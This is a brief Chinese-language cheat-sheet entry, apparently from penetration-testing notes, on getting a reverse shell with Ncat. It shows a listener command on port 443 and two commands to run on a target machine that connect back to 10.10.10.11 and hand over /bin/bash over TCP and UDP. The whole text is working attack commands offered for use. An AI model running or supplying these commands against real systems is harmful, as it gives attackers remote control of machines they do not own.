# Ncat反弹shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443

```

然后在靶机上执行如下命令：

```bash
ncat 10.10.10.11 443 -e /bin/bash

```

```bash
ncat --udp 10.10.10.11 443 -e /bin/bash

```

